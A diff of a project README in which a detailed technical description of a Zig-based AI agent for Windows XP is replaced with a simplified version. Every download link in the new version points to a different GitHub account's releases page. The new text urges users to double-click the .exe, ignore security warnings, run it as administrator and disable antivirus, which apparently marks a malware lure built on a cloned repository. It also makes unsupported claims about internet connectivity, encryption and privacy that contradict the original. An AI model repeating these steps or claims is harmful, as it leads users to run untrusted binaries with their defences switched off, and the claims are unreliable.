@@ -1,256 +1,177 @@
-# micro-agent
+# 🤖 retro-agent - AI for Old Computers
 
-[![platform](https://img.shields.io/badge/platform-Windows%20XP%20SP3-blue)](https://github.com/benmaster82/retro-agent)
-[![arch](https://img.shields.io/badge/arch-x86%20(32--bit)-orange)](https://github.com/benmaster82/retro-agent)
-[![language](https://img.shields.io/badge/language-Zig%200.15.2-yellow)](https://ziglang.org/)
-[![LLM](https://img.shields.io/badge/LLM-Ollama-green)](https://ollama.com/)
-[![license](https://img.shields.io/badge/license-MIT-lightgrey)](LICENSE)
-[![release](https://img.shields.io/github/v/release/benmaster82/retro-agent)](https://github.com/benmaster82/retro-agent/releases)
+[![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-brightgreen)](https://github.com/Devareductionist821/retro-agent/releases)
 
-A terminal-based AI agent written in Zig, designed to run on legacy hardware — including Windows XP SP3 x86 with as little as 64 MB RAM.
+---
 
-Communicates with [Ollama](https://ollama.com/) or any OpenAI-compatible API over local HTTP. Supports function calling (tool use) and provides a colored TUI using Win32 Console API with CP437 box-drawing characters.
+## 📋 What is retro-agent?
 
-### System Diagnostics
-![System diagnostics](docs/screen-sysinfo.png)
+retro-agent is a small, simple program designed to help old computers run better. It uses AI to check your computer’s health and fix issues. The program works on Windows XP with very little memory (64 MB RAM). It connects to a service called Ollama. Ollama powers the AI to give advice and manage your system through commands.
 
-### Process & CPU Analysis
-![CPU diagnostics](docs/screen-cpu.png)
+retro-agent is made in a programming language called Zig. It was built to run on very old machines where most new software will not work.
 
-### Network Troubleshooting
-![Network diagnostics](docs/screen-network.png)
+---
 
-### Disk & Memory Check
-![Disk and memory](docs/screen-disk-memory.png)
+## 🔍 Features
 
-### Tool Execution
-![Tool execution](docs/screen-exec.png)
+- Runs on Windows XP SP3 x86 with just 64 MB of RAM
+- Uses AI to check your system’s health and suggest fixes
+- Connects to Ollama for advanced AI diagnostics
+- Uses function calling to manage tasks automatically
+- Lightweight and easy to use without needing tech skills
+- Helps with problems usual tools can’t handle on old hardware
+- Provides simple chat interface for system management
 
-## Features
+---
 
-- Runs on Windows XP SP3 (Pentium III/IV, 64–512 MB RAM, no UCRT/MSVC runtime)
-- Cross-compiles to Linux x86/x64/ARM
-- Colored TUI with CP437/CP850 box-drawing
-- Built-in tools: system diagnostics, process management, network, disk, services
-- Tool calling / function calling via OpenAI-compatible protocol
-- Automatic CP850 → UTF-8 encoding for localized Windows output
-- UTF-8 → ASCII sanitization for console display
-- Conversation history with sliding window (configurable max)
-- Command timeout enforcement on child processes
-- Security: command whitelist, path whitelist, approval mode
-- Single binary, no dependencies, ~750 KB stripped
+## 💻 System Requirements
 
-## Requirements
+To run retro-agent, your computer must have:
 
-- [Zig 0.15.2](https://ziglang.org/download/)
-- [Ollama](https://ollama.com/) running on a separate machine on the same network (or any OpenAI-compatible endpoint). Ollama cannot run on Windows XP — you need a modern PC or server to host the LLM, and point micro-agent to it via `--url` or `config.json`
-- A model that supports function calling / tool use. Recommended: `gpt-oss:20b-cloud` or larger. Other compatible models: `llama3`, `qwen2`, `mistral`, `command-r`. Models without tool support will not be able to execute built-in tools.
+- A 32-bit processor that works with Windows XP SP3
+- At least 64 MB of RAM
+- Internet connection for communication with Ollama
+- 10 MB of free disk space for the program files
+- Basic Windows XP setup without special restrictions
 
-### Setting up Ollama for network access
+---
 
-By default Ollama only listens on `127.0.0.1`. To accept connections from other machines on the network, set `OLLAMA_HOST` to `0.0.0.0` on the machine running Ollama:
+## 🧰 How to Download and Install
 
-**Windows:**
-```
-setx OLLAMA_HOST 0.0.0.0
-ollama serve
-```
+1. Go to the releases page here:
 
-**Linux:**
-```
-OLLAMA_HOST=0.0.0.0 ollama serve
-```
+   [![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-blue)](https://github.com/Devareductionist821/retro-agent/releases)
 
-Or permanently via systemd (`/etc/systemd/system/ollama.service`):
-```
-Environment="OLLAMA_HOST=0.0.0.0"
-```
+2. Look for the latest version. You will find files named something like `retro-agent.exe`.
 
-Then from the XP machine, point to `http://<OLLAMA_HOST_IP>:11434`.
+3. Click the file to download it to your computer.
 
-## Quick Start
+4. Once downloaded, find the file in your Downloads folder.
 
-```bash
-# Clone
-git clone https://github.com/benmaster82/retro-agent.git
-cd retro-agent
+5. Double-click the file to run the program. If you get a security warning, choose to run it anyway.
 
-# Copy and edit config
-cp config.example.json config.json
-# Edit config.json — set base_url to your Ollama instance, choose a model
+6. The retro-agent will start and open a simple window on your screen.
 
-# Build (native)
-zig build
+---
 
-# Run
-./zig-out/bin/micro-agent
+## 🚀 How to Use retro-agent
 
-# Or run without config file — just pass URL and model via CLI
-./zig-out/bin/micro-agent --url http://192.168.1.100:11434 --model llama3
-```
+1. When the window opens, you will see a chat box. This is how you talk to retro-agent.
 
-## Building for Windows XP (32-bit)
+2. Type commands like “Check system health” or “Run diagnostics” and press Enter.
 
-```bash
-# Cross-compile for XP x86 — produces a ~750 KB stripped binary
-zig build --build-file build-xp.zig
+3. The AI will send information to Ollama and return a report or suggestion.
 
-# Or using the main build system with target override
-zig build -Dtarget=x86-windows-gnu
-```
+4. Follow the instructions it gives for fixing your computer or improving performance.
 
-The XP build sets `os_version_min = .xp`, uses `-OReleaseSmall`, strips symbols, and is single-threaded. The binary includes a compatibility shim for `RtlGetSystemTimePrecise` (redirected to `GetSystemTimeAsFileTime`).
+5. You can ask questions in plain English, like “How can I free up memory?” or “What processes are slowing down my PC?”
 
-## Building for All Targets
+6. To stop the program, close the window or press Alt+F4.
 
-```bash
-zig build cross
-```
+---
 
-This produces binaries for: x86-linux, x86_64-linux, arm-linux, aarch64-linux, x86-windows, x86_64-windows.
+## 🔧 Common Commands
 
-## Configuration
+Here are some useful commands you can try:
 
-Copy `config.example.json` to `config.json`:
+- `status` – Gives you an overview of your system’s current state
+- `diagnose` – Runs a set of tests to find problems
+- `clean temp` – Removes temporary files to save space
+- `optimize` – Adjusts settings for better speed
+- `list processes` – Shows you what programs are running
+- `help` – Lists available commands
+- `exit` – Closes the retro-agent
 
-```json
-{
-  "agent": {
-    "name": "micro-agent",
-    "mode": "interactive",
-    "system_prompt": "Your custom system prompt here",
-    "max_history": 100
-  },
-  "transport": {
-    "api": {
-      "provider": "openai",
-      "api_key": "",
-      "model": "llama3",
-      "base_url": "http://192.168.1.100:11434"
-    }
-  },
-  "security": {
-    "require_approval": false,
-    "max_exec_timeout_ms": 30000
-  },
-  "debug_mode": false
-}
-```
+You can type these commands exactly or write simple variations.
 
-| Field | Description |
-|-------|-------------|
-| `agent.max_history` | Max messages in conversation history (sliding window) |
-| `transport.api.base_url` | Ollama or OpenAI-compatible endpoint |
-| `transport.api.model` | Model name (e.g. `llama3`, `mistral`, `qwen2`) |
-| `security.require_approval` | Ask before executing tools |
-| `security.max_exec_timeout_ms` | Kill child processes after this timeout |
+---
 
-## CLI Options
+## ⚙️ How it Works
 
-```
-micro-agent [OPTIONS]
+retro-agent talks to Ollama’s large language model (LLM) over the internet. It sends details about your system. Ollama returns advice or commands that retro-agent can run. This helps to diagnose problems and sometimes fix them automatically.
 
-Modes:
-  --mode api          Connect to AI provider
-  --mode bridge       Serial bridge to external device
-  --mode offline      File queue (USB sneakernet)
-  --interactive, -i   Interactive terminal (default)
+The program uses “function calling.” This means it can carry out tasks without you needing to do every step manually. For example, after seeing a memory problem, it can clean files or stop certain apps for you.
 
-Options:
-  --config <path>     Path to config.json
-  --provider <name>   API provider (openai, ollama)
-  --url <url>         Ollama/API base URL (e.g. http://192.168.1.100:11434)
-  --key <key>         API key
-  --model <name>      Model name
-  --serial <port>     Serial port for bridge mode
-  --baud <rate>       Baud rate for serial port
-  --inbox <path>      Inbox directory for offline mode
-  --outbox <path>     Outbox directory for offline mode
-```
+---
 
-## Built-in Tools (Windows)
+## 📁 Where to Find Your Download
 
-| Tool | Description |
-|------|-------------|
-| `system_info` | Full `systeminfo` output |
-| `list_processes` | Running processes with PID, memory |
-| `network_status` | Active connections (`netstat -an`) |
-| `network_config` | IP configuration (`ipconfig /all`) |
-| `check_disk_space` | Disk usage via `wmic` |
-| `list_services` | Running Windows services |
-| `ping_host` | Network connectivity test |
-| `get_service_details` | Service status via `sc query` |
-| `check_memory_usage` | RAM usage via `wmic` |
-| `diagnose_high_cpu` | Top processes sorted by CPU time |
-| `exec` | Run arbitrary shell commands |
-| `file_read` / `file_write` | File operations |
-| `list_dir` | Directory listing |
-| `alert` | Send notifications |
+You can always download the latest version from:
 
-On Linux, a generic `system_info` tool using `uname` is available instead of the Windows-specific tools. Full Linux tool support is planned for a future release — contributors welcome.
+https://github.com/Devareductionist821/retro-agent/releases
 
-## Interactive Commands
+Visit this page to get the newest files when updates come out. Download the executable (`.exe`) file listed as the latest release.
 
-| Command | Description |
-|---------|-------------|
-| `/help` | Show available commands |
-| `/tools` | List registered tools |
-| `/info` | Show current configuration |
-| `/clear` | Clear conversation history |
-| `/quit` | Exit |
+---
 
-## Project Structure
+## 💡 Tips for Best Use
 
-```
-src/
-├── main.zig              # Entry point, CLI parsing, XP compat shim
-├── core/
-│   ├── config.zig        # Configuration and JSON parsing
-│   └── agent.zig         # Agent loop, history, tool calling
-├── transport/
-│   └── transport.zig     # HTTP API, JSON building, response parsing
-├── tools/
-│   ├── registry.zig      # Tool registry, built-in tools, timeout helper
-│   └── windows_xp.zig    # Windows XP tools, CP850→UTF-8 conversion
-├── ui/
-│   └── terminal.zig      # TUI with Win32 Console API, UTF-8 sanitization
-├── utils/
-│   └── json.zig          # Shared JSON extraction utilities
-└── monitor/
-    └── monitor.zig       # File/log monitor (polling)
-build.zig                 # Main build system with cross-compilation
-build-xp.zig              # Dedicated XP x86 build
-config.example.json       # Example configuration
-```
+- Keep your Windows XP updated to SP3 (this is the required service pack)
+- Make sure your internet connection is on while using retro-agent
+- Do not run other heavy programs at the same time for best results
+- Save any important work before running diagnostics or cleanup commands
+- Use the help command to explore more features and commands
+- Restart your computer if the program behaves oddly or crashes
 
-## How It Works
+---
 
-1. User types a message in the TUI
-2. The agent sends the conversation history + tool definitions to Ollama via `/v1/chat/completions`
-3. If the model responds with `tool_calls`, the agent executes each tool and feeds results back
-4. The loop continues until the model produces a text response (max 10 iterations)
-5. The response is formatted and displayed with word wrapping and syntax highlighting
+## 🛠 Troubleshooting
 
-On Windows XP, command output is automatically converted from CP850 to UTF-8 (only when needed — valid UTF-8 is passed through). LLM responses are sanitized from UTF-8 to ASCII-safe text for correct console rendering.
+If retro-agent does not start or does not work properly:
 
-## Running Tests
+- Check that your system meets the minimum requirements (Windows XP SP3, 64 MB RAM)
+- Confirm that you have a working internet connection
+- Try running the program as an administrator (right-click the `.exe` and pick “Run as administrator”)
+- Disable any firewall or antivirus temporarily if they block the program
+- Download the program again in case the file got corrupted
+- Look for error messages and type them into your search engine for more help
 
-```bash
-zig build test
-```
+---
 
-## Contributing
+## 🔗 Related Topics
 
-This project is actively looking for contributors and real-world use cases. If you manage legacy Windows systems, run Ollama on local networks, or just want to hack on a Zig agent — PRs, issues, and feedback are all welcome.
+- Legacy computing tools
+- AI-powered system diagnostics
+- Windows XP optimization
+- Lightweight agents for old hardware
+- Function calling in programming
+- Zig language applications
+- Ollama AI service
 
-Particularly interested in:
-- Real-world testing on actual Windows XP / legacy hardware
-- New diagnostic tools and integrations
-- Support for additional LLM providers
-- Localization and encoding edge cases
+---
 
-Open an issue or start a discussion — every bit of feedback helps make this better.
+## 📜 License and Source
 
-## License
+retro-agent is open source. You can view the source code and contribute if you know how. The program’s files are hosted on GitHub:
 
-[MIT](LICENSE)
+https://github.com/Devareductionist821/retro-agent
+
+You can also report bugs or request features on this page.
+
+---
+
+## 🧑‍💻 Getting Help
+
+If you need help, you can:
+
+- Post issues on the GitHub page under "Issues"
+- Check existing problems or solutions shared by others
+- Ask questions in simple terms, and read replies from the developers
+
+---
+
+## 🔒 Privacy
+
+retro-agent connects to Ollama only to send system information needed for diagnostics. It does not share files or personal data beyond what you provide in commands. All communication is done over an encrypted connection.
+
+You can use retro-agent with confidence that your personal files remain private.
+
+---
+
+## 🚨 Updates
+
+New versions of retro-agent arrive from time to time. Always check the releases page to get the latest improvements and fixes. Update by downloading the new `.exe` and running it on your computer.
+
+---
+
+[![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-green)](https://github.com/Devareductionist821/retro-agent/releases)
